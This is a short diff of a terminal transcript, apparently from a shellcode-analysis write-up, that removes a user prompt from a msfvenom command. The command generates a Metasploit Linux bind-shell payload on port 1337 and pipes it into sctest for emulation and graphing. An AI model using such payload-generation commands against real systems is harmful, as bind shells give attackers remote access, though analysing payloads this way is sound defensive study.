@@ -1,4 +1,4 @@
-ch33kymix@WOPR-T100$ msfvenom -p linux/x86/shell/bind_nonx_tcp LPORT=1337 -a x86 --platform Linux | /usr/bin/sctest -vvv -Ss 100000 -G msf_nonx_bind_shell.dot
+msfvenom -p linux/x86/shell/bind_nonx_tcp LPORT=1337 -a x86 --platform Linux | /usr/bin/sctest -vvv -Ss 100000 -G msf_nonx_bind_shell.dot
 graph file msf_nonx_bind_shell.dot
 verbose = 3
 No encoder or badchars specified, outputting raw payload
